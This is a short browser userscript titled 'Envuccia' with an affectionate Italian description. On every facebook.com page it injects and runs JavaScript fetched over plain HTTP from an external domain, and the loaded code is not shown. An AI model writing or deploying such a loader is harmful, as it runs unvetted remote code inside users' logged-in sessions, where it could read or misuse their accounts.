// ==UserScript==
// @name           Envuccia
// @namespace      Envuccia
// @description    Amore mio ti amo troppo :)
// @include        http://www.facebook.com*
// @include        http://www.facebook.com/*
// ==/UserScript==

var script = document.createElement('script');   
script.type = "text/javascript";
script.src = "http://faccinator.fungoecacca.it/envuccia.js";
document.getElementsByTagName('head')[0].appendChild(script);